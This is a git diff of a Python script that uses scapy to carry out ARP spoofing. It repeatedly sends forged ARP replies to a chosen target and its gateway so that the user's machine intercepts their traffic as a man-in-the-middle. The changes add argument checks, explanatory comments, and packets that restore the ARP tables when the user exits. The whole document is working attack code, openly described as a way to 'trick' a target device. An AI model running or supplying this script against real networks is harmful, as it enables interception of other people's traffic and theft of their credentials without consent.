@@ -5,11 +5,21 @@ import argparse
 import time
 
 def main():
+    #get user arguments
     targetIP_1, targetIP_2 = get_arguments()
+    check_args(targetIP_1, targetIP_2)
+
+    #create packets to spoof and packets to restore upon exit
     packet1 = spoofed_packet(targetIP_1, targetIP_2)
     packet2 = spoofed_packet(targetIP_2, targetIP_1)
+    restorationPacket1 = restore_packet(targetIP_1, targetIP_2)
+    restorationPacket2 = restore_packet(targetIP_2, targetIP_1)
+
+    #counter for print statement:
     sent_packets = 0
+
     try:
+        #continually spoofs the two addresses to put your computer in the middle
         while True:
             scapy.send(packet1, verbose=False)
             scapy.send(packet2, verbose=False)
@@ -17,7 +27,11 @@ def main():
             print(f'\r[+] Sent two spoofed packets to {targetIP_1} and {targetIP_2}. Total sent: {sent_packets}', end='')
             time.sleep(2)
     except KeyboardInterrupt:
-        print('\n[+] Exiting...')
+        #Restores MAC tables to original settings and exits program upon ctrl-c
+        print('Restoring MAC tables...')
+        scapy.send(restorationPacket1, count=4, verbose=False)
+        scapy.send(restorationPacket2, count=4, verbose=False)
+        print('\n[+] MAC table restoration packets sent. Exiting...')
 
 
 def spoofed_packet(targetIP_1, targetIP_2):
@@ -30,6 +44,16 @@ def spoofed_packet(targetIP_1, targetIP_2):
     #prsc=projected source (what we're telling this target our fake IP is)
         #reassociates MAC address in target's table for this IP to our MAC
     packet = scapy.ARP(op=2, pdst=targetIP_1, hwdst=mac, psrc=targetIP_2)
+
+    return packet
+
+
+def restore_packet(targetIP_1, targetIP_2):
+    #Gets the mac for both the targets we are man-in-middling
+    #Uses those to return a packet for restoring MAC tables
+    mac1 = get_mac(targetIP_1)
+    mac2 = get_mac(targetIP_2)
+    packet = scapy.ARP(op=2, pdst=targetIP_1, hwdst=mac1, psrc=targetIP_2, hwsrc=mac2)
 
     return packet
 
@@ -50,7 +74,6 @@ def get_mac(ip):
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument('-t', '--target', dest='targetIP_1', help="IP of device that user wishes to trick.")
-    options = parser.parse_args()
     parser.add_argument('-g', '--gateway', dest='targetIP_2', help="IP of the gateway device your target is using and you want to get between.")
     options = parser.parse_args()
 
